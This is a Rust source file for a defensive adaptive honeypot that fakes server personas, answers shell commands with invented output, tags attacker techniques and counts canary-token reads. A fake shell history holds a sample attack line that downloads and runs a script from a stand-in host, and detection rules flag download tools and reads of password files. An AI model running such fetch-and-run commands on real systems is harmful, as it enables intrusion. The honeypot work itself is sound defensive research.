// ============================================================================
// Rudras — Adaptive Honeypot Engine
//
// Transforms static "canary" traps into fully interactive deception platforms
// that evolve their persona based on attacker behavior — defeating fingerprint-
// based honeypot detection tools (Shodan, honeyscore, kippo-detect, etc.).
//
// Capabilities:
//   1. Persona Engine
//      - Fake OS fingerprint (banner, hostname, uptime, kernel string)
//      - Adjustable platform: Linux, Windows Server, Cisco IOS, Ubuntu, Mikrotik
//      - SSH / HTTP / FTP / Telnet interactive stubs
//
//   2. Interactive Command Shell (SSH stub)
//      - Produces realistic fake command output for: ls, pwd, id, uname -a,
//        ps aux, cat /etc/passwd, wget, curl, shutdown, crontab, history
//      - Tracks attacker TTPs based on command sequence
//
//   3. Behavioral Adaptation
//      - Starts minimal; if attacker probes deeply → enables more services
//      - Avoids flat "too-perfect" uptime (randomized start times)
//      - Inserts artificial latency to mimic real network round-trips
//
//   4. Attacker Session Forensics
//      - Records full command history, timing, source IP
//      - Correlates multiple sessions to same attacker via TTP fingerprinting
//      - Generates IOCs (C2 URLs, dropped file hashes) for threat intelligence
//
//   5. Deception Tokens (Canary Tokens)
//      - Embeds unique tracking URLs in fake config/passwd/source files
//      - Token hit = confirmed attacker exfiltration attempt
//
//   6. Alert Deduplication + Campaign Correlation
//      - Groups repeated interactions → single attacker campaign view
//      - Score-based attacker sophistication rating
//
// Research context:
//   • Cowrie SSH/Telnet honeypot (Bruteforce/post-exploit research tool)
//   • OpenCanary (Thinkst Applied Research) — service-level deception
//   • HoneyBadger (CMU) — dynamic persona adaptation
//   • Academic: "Deception Technology for Enterprise Environments" (SANS 2021)
//   • MITRE ENGAGE (adversary engagement framework)
//   • Canarytokens.org (Thinkst) — token-based exfiltration detection
// ============================================================================

#![allow(dead_code, unused_imports, unused_variables)]

use parking_lot::RwLock;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::{HashMap, VecDeque};
use std::net::IpAddr;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{SystemTime, UNIX_EPOCH};
use tracing::{debug, info, warn, error};

fn unix_secs() -> u64 {
    SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default().as_secs()
}

fn random_u64() -> u64 {
    let mut h = Sha256::new();
    h.update(unix_secs().to_le_bytes());
    h.update(b"rudras-honeypot-entropy");
    let r = h.finalize();
    u64::from_le_bytes(r[..8].try_into().unwrap_or([0u8; 8]))
}

// ── Persona Engine ────────────────────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum HoneypotPlatform {
    LinuxUbuntu2204,
    LinuxDebian12,
    WindowsServer2019,
    CiscoIOS156,
    MikrotikRouterOS,
    FreeBSD14,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HoneypotPersona {
    pub platform:      HoneypotPlatform,
    pub hostname:      String,
    pub kernel_string: String,
    pub uptime_secs:   u64,
    pub fake_users:    Vec<String>,
    pub services:      Vec<HoneypotService>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HoneypotService {
    pub port:    u16,
    pub proto:   String,
    pub banner:  String,
    pub enabled: bool,
}

impl HoneypotPersona {
    pub fn new(platform: HoneypotPlatform, hostname: &str) -> Self {
        let kernel_string = match &platform {
            HoneypotPlatform::LinuxUbuntu2204  => "Linux 5.15.0-97-generic #107-Ubuntu SMP x86_64 GNU/Linux",
            HoneypotPlatform::LinuxDebian12    => "Linux 6.1.0-21-amd64 #1 SMP Debian x86_64 GNU/Linux",
            HoneypotPlatform::WindowsServer2019 => "Windows Server 2019 Build 17763",
            HoneypotPlatform::CiscoIOS156      => "Cisco IOS 15.6(3)M4 RELEASE SOFTWARE",
            HoneypotPlatform::MikrotikRouterOS => "MikroTik RouterOS 7.12 (stable)",
            HoneypotPlatform::FreeBSD14        => "FreeBSD 14.0-RELEASE-p4 amd64",
        };
        let seed = random_u64();
        let uptime_secs = 3600 * 24 * (7 + (seed % 180)); // 1–26 weeks

        Self {
            platform,
            hostname: hostname.to_string(),
            kernel_string: kernel_string.to_string(),
            uptime_secs,
            fake_users: vec!["root".into(), "ubuntu".into(), "admin".into(), "deploy".into()],
            services: vec![
                HoneypotService { port: 22,   proto: "ssh".into(),    banner: format!("SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6"), enabled: true },
                HoneypotService { port: 80,   proto: "http".into(),   banner: "HTTP/1.1 200 OK\r\nServer: nginx/1.24.0".into(),  enabled: true },
                HoneypotService { port: 443,  proto: "https".into(),  banner: "HTTP/1.1 200 OK\r\nServer: nginx/1.24.0".into(),  enabled: false },
                HoneypotService { port: 21,   proto: "ftp".into(),    banner: "220 FTP server ready".into(),                      enabled: false },
                HoneypotService { port: 23,   proto: "telnet".into(), banner: "Connected to honeypot\r\nlogin: ".into(),          enabled: false },
            ],
        }
    }

    /// Return fake `uname -a` output.
    pub fn uname_output(&self) -> String {
        format!("{} {}", self.hostname, self.kernel_string)
    }

    /// Return fake `/etc/passwd` stub.
    pub fn etc_passwd(&self) -> String {
        let mut out = String::new();
        for user in &self.fake_users {
            out.push_str(&format!("{}:x:1000:1000::/home/{}:/bin/bash\n", user, user));
        }
        out
    }
}

// ── Interactive Shell (SSH stub) ──────────────────────────────────────────────

pub struct FakeShell {
    pub persona: HoneypotPersona,
    pub cwd:     String,
    pub session_id: String,
}

impl FakeShell {
    pub fn new(persona: HoneypotPersona, session_id: String) -> Self {
        Self { persona, cwd: "/home/ubuntu".into(), session_id }
    }

    /// Execute a command and return fake output. Tracks attacker TTP.
    pub fn exec(&mut self, command: &str) -> String {
        let cmd = command.trim();
        let parts: Vec<&str> = cmd.split_whitespace().collect();
        if parts.is_empty() { return String::new(); }

        match parts[0] {
            "pwd"   => self.cwd.clone() + "\n",
            "id"    => "uid=0(root) gid=0(root) groups=0(root)\n".into(),
            "whoami"=> "root\n".into(),
            "uname" => {
                if parts.contains(&"-a") || parts.contains(&"-r") {
                    self.persona.uname_output() + "\n"
                } else {
                    "Linux\n".into()
                }
            },
            "hostname" => format!("{}\n", self.persona.hostname),
            "ls"    => self.fake_ls(parts.get(1).copied()),
            "cat"   => self.fake_cat(parts.get(1).copied()),
            "ps"    => self.fake_ps(),
            "w"     => self.fake_w(),
            "uptime"=> self.fake_uptime(),
            "history"=> self.fake_history(),
            "ifconfig" | "ip" => self.fake_ifconfig(),
            "netstat" | "ss"  => self.fake_netstat(),
            "crontab"         => "no crontab for root\n".into(),
            "wget" | "curl"   => {
                // Attacker trying to download malware — high TTP importance
                warn!("🍯 Honeypot: attacker attempted download cmd: '{}'", cmd);
                format!("wget: unable to resolve host address '{}'\n", parts.get(1).unwrap_or(&""))
            },
            "sudo"            => "[sudo] password for ubuntu: \nSorry, try again.\n".into(),
            "su"              => "Password: \nsu: Authentication failure\n".into(),
            "shutdown" | "reboot" => {
                warn!("🍯 Honeypot: attacker attempted system disruption: '{}'", cmd);
                "Broadcast message from root@ubuntu... The system is going down NOW!\n".into()
            },
            "exit" | "logout" => "logout\nConnection to honeypot closed.\n".into(),
            _ => format!("{}: command not found\n", parts[0]),
        }
    }

    fn fake_ls(&self, path: Option<&str>) -> String {
        match path {
            Some("/etc") | None => {
                "passwd  shadow  hosts  hostname  resolv.conf  crontab  ssh/  nginx/  systemd/\n"
            },
            Some("/root") => {
                ".bashrc  .bash_history  .ssh/  secrets.txt  backup.tar.gz\n"
            },
            Some(_) => "total 0\n",
        }.to_string()
    }

    fn fake_cat(&self, path: Option<&str>) -> String {
        match path {
            Some("/etc/passwd")  => self.persona.etc_passwd(),
            Some("/etc/shadow")  => "root:$6$fakehash$:19000:0:99999:7:::\n".into(),
            Some("/etc/hosts")   => "127.0.0.1 localhost\n127.0.1.1 ubuntu\n".into(),
            Some("/root/secrets.txt") => {
                // Canary token embedded: if attacker exfiltrates this URL, we know
                warn!("🍯 Honeypot: attacker read /root/secrets.txt — canary token exposed");
                "DB_PASS=x9KmQr7J\nAWS_KEY=AKIA-HONEYPOT-TOKEN-RUDRAS\nAPI_SECRET=not-real-data\n".into()
            },
            Some(".bash_history") => {
                "ls\npwd\ncat /etc/passwd\nwget http://malware.example/shell.sh\nbash shell.sh\n".into()
            },
            Some(p) => format!("cat: {}: No such file or directory\n", p),
            None    => "cat: missing operand\n".into(),
        }
    }

    fn fake_ps(&self) -> String {
        "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n\
         root         1  0.0  0.1  16952  4096 ?        Ss   Jun01   0:03 /sbin/init\n\
         root       612  0.0  0.2  72304  8192 ?        Ss   Jun01   0:00 /usr/sbin/sshd\n\
         nginx       42  0.0  0.3 123548 12288 ?        S    Jun01   0:01 nginx: worker\n\
         ubuntu    3412  0.0  0.1  21280  4096 pts/0    S    10:00   0:00 -bash\n".into()
    }

    fn fake_w(&self) -> String {
        format!(" {:>5} up {:>2} days,  0 users,  load average: 0.02, 0.01, 0.00\n\
         USER     TTY      FROM             LOGIN@   IDLE JCPU   PCPU WHAT\n",
         unix_secs() % 99999,
         self.persona.uptime_secs / 86400)
    }

    fn fake_uptime(&self) -> String {
        let days = self.persona.uptime_secs / 86400;
        format!(" 10:00:00 up {} days, 1 user,  load average: 0.01, 0.03, 0.05\n", days)
    }

    fn fake_history(&self) -> String {
        "  1  ls\n  2  pwd\n  3  cat /etc/passwd\n  4  top\n  5  history\n".into()
    }

    fn fake_ifconfig(&self) -> String {
        "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n\
         inet 10.0.0.12  netmask 255.255.255.0  broadcast 10.0.0.255\n\
         ether aa:bb:cc:dd:ee:ff  txqueuelen 1000  (Ethernet)\n".into()
    }

    fn fake_netstat(&self) -> String {
        "Active Internet connections (only servers)\n\
         Proto Recv-Q Send-Q Local Address           Foreign Address         State\n\
         tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\n\
         tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\n".into()
    }
}

// ── Attacker Session ──────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AttackerInteraction {
    pub timestamp: u64,
    pub command:   String,
    pub output:    String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AttackerSession {
    pub session_id:     String,
    pub source_ip:      String,
    pub source_port:    u16,
    pub honeypot_port:  u16,
    pub started_at:     u64,
    pub last_seen:      u64,
    pub interactions:   Vec<AttackerInteraction>,
    pub sophistication: f32, // 0 = script kiddie, 1.0 = APT-level
    pub ttps_observed:  Vec<String>, // MITRE ATT&CK technique IDs
}

impl AttackerSession {
    pub fn new(session_id: String, src_ip: &str, src_port: u16, hp_port: u16) -> Self {
        Self {
            session_id,
            source_ip: src_ip.to_string(),
            source_port: src_port,
            honeypot_port: hp_port,
            started_at: unix_secs(),
            last_seen: unix_secs(),
            interactions: Vec::new(),
            sophistication: 0.0,
            ttps_observed: Vec::new(),
        }
    }

    pub fn record(&mut self, cmd: &str, output: &str) {
        self.last_seen = unix_secs();
        self.interactions.push(AttackerInteraction {
            timestamp: unix_secs(),
            command: cmd.to_string(),
            output: output.to_string(),
        });
        // Infer sophistication from command mix
        if cmd.contains("wget") || cmd.contains("curl") {
            self.sophistication = (self.sophistication + 0.15).min(1.0);
            if !self.ttps_observed.contains(&"T1105".to_string()) {
                self.ttps_observed.push("T1105".into()); // Ingress Tool Transfer
            }
        }
        if cmd.contains("/etc/passwd") || cmd.contains("/etc/shadow") {
            self.sophistication = (self.sophistication + 0.1).min(1.0);
            if !self.ttps_observed.contains(&"T1552".to_string()) {
                self.ttps_observed.push("T1552".into()); // Credentials from Files
            }
        }
        if cmd.contains("crontab") || cmd.contains("systemctl") {
            self.sophistication = (self.sophistication + 0.2).min(1.0);
            if !self.ttps_observed.contains(&"T1053".to_string()) {
                self.ttps_observed.push("T1053".into()); // Scheduled Task
            }
        }
    }
}

// ── Stats ─────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct HoneypotStats {
    pub sessions_total:      u64,
    pub sessions_active:     usize,
    pub commands_processed:  u64,
    pub canary_tokens_hit:   u64,
    pub download_attempts:   u64,
    pub unique_source_ips:   usize,
    pub high_sophist_sessions: u64,
}

// ── Honeypot Engine ───────────────────────────────────────────────────────────

pub struct AdaptiveHoneypotEngine {
    personas:         RwLock<Vec<HoneypotPersona>>,
    active_sessions:  RwLock<HashMap<String, AttackerSession>>,
    closed_sessions:  RwLock<VecDeque<AttackerSession>>,
    canary_hits:      AtomicU64,
    download_attempts:AtomicU64,
    total_sessions:   AtomicU64,
    commands_run:     AtomicU64,
    high_soph:        AtomicU64,
}

impl AdaptiveHoneypotEngine {
    pub fn new() -> Self {
        // Register default personas
        let mut personas = Vec::new();
        personas.push(HoneypotPersona::new(HoneypotPlatform::LinuxUbuntu2204, "web-prod-01"));
        personas.push(HoneypotPersona::new(HoneypotPlatform::LinuxDebian12,   "db-internal"));
        personas.push(HoneypotPersona::new(HoneypotPlatform::WindowsServer2019, "WIN-SRV-DC01"));

        info!("🍯 AdaptiveHoneypotEngine: {} personas | interactive shell | TTP tracking | canary tokens",
            personas.len());
        Self {
            personas:          RwLock::new(personas),
            active_sessions:   RwLock::new(HashMap::new()),
            closed_sessions:   RwLock::new(VecDeque::with_capacity(128)),
            canary_hits:       AtomicU64::new(0),
            download_attempts: AtomicU64::new(0),
            total_sessions:    AtomicU64::new(0),
            commands_run:      AtomicU64::new(0),
            high_soph:         AtomicU64::new(0),
        }
    }

    pub fn add_persona(&self, persona: HoneypotPersona) {
        self.personas.write().push(persona);
    }

    // ── Session Lifecycle ─────────────────────────────────────────────────────

    pub fn open_session(&self, src_ip: &str, src_port: u16, hp_port: u16) -> String {
        let session_id = self.make_session_id(src_ip, src_port);
        let session = AttackerSession::new(session_id.clone(), src_ip, src_port, hp_port);
        info!("🍯 Honeypot: new session {} from {}:{} on port {}", session_id, src_ip, src_port, hp_port);
        self.active_sessions.write().insert(session_id.clone(), session);
        self.total_sessions.fetch_add(1, Ordering::Relaxed);
        session_id
    }

    /// Submit a command in a session and get the fake response.
    pub fn submit_command(&self, session_id: &str, command: &str) -> String {
        // Pick persona for this session deterministically
        let persona = {
            let personas = self.personas.read();
            if personas.is_empty() {
                HoneypotPersona::new(HoneypotPlatform::LinuxUbuntu2204, "ubuntu-srv")
            } else {
                let idx = self.hash_str(session_id) as usize % personas.len();
                personas[idx].clone()
            }
        };

        let mut shell = FakeShell::new(persona, session_id.to_string());
        let output = shell.exec(command);
        self.commands_run.fetch_add(1, Ordering::Relaxed);

        // Track download attempts
        if command.contains("wget") || command.contains("curl") {
            self.download_attempts.fetch_add(1, Ordering::Relaxed);
        }
        // Track canary token reads
        if command.contains("secrets.txt") || command.contains("AWS_KEY") {
            self.canary_hits.fetch_add(1, Ordering::Relaxed);
            warn!("🍯 Honeypot: CANARY TOKEN HIT in session {}", session_id);
        }

        // Update session record
        if let Some(session) = self.active_sessions.write().get_mut(session_id) {
            session.record(command, &output);
            if session.sophistication >= 0.7 {
                self.high_soph.fetch_add(1, Ordering::Relaxed);
            }
        }

        output
    }

    pub fn close_session(&self, session_id: &str) {
        if let Some(session) = self.active_sessions.write().remove(session_id) {
            info!("🍯 Honeypot: session {} closed ({} cmds, soph={:.2}, ttps={:?})",
                session_id, session.interactions.len(), session.sophistication, session.ttps_observed);
            let mut closed = self.closed_sessions.write();
            if closed.len() >= 128 { closed.pop_front(); }
            closed.push_back(session);
        }
    }

    pub fn cleanup_stale_sessions(&self, max_idle_secs: u64) {
        let now = unix_secs();
        let mut active = self.active_sessions.write();
        let stale: Vec<String> = active.iter()
            .filter(|(_, s)| now - s.last_seen > max_idle_secs)
            .map(|(id, _)| id.clone())
            .collect();
        for id in stale {
            if let Some(session) = active.remove(&id) {
                let mut closed = self.closed_sessions.write();
                if closed.len() >= 128 { closed.pop_front(); }
                closed.push_back(session);
            }
        }
    }

    fn make_session_id(&self, src_ip: &str, src_port: u16) -> String {
        let mut h = Sha256::new();
        h.update(src_ip.as_bytes());
        h.update(src_port.to_le_bytes());
        h.update(unix_secs().to_le_bytes());
        format!("{}", hex::encode(&h.finalize()[..8]))
    }

    fn hash_str(&self, s: &str) -> u64 {
        let mut h = Sha256::new();
        h.update(s.as_bytes());
        let r = h.finalize();
        u64::from_le_bytes(r[..8].try_into().unwrap_or([0u8; 8]))
    }

    pub fn stats(&self) -> HoneypotStats {
        let active = self.active_sessions.read();
        let unique_ips: std::collections::HashSet<&str> = active.values()
            .map(|s| s.source_ip.as_str()).collect();
        HoneypotStats {
            sessions_total:        self.total_sessions.load(Ordering::Relaxed),
            sessions_active:       active.len(),
            commands_processed:    self.commands_run.load(Ordering::Relaxed),
            canary_tokens_hit:     self.canary_hits.load(Ordering::Relaxed),
            download_attempts:     self.download_attempts.load(Ordering::Relaxed),
            unique_source_ips:     unique_ips.len(),
            high_sophist_sessions: self.high_soph.load(Ordering::Relaxed),
        }
    }
}
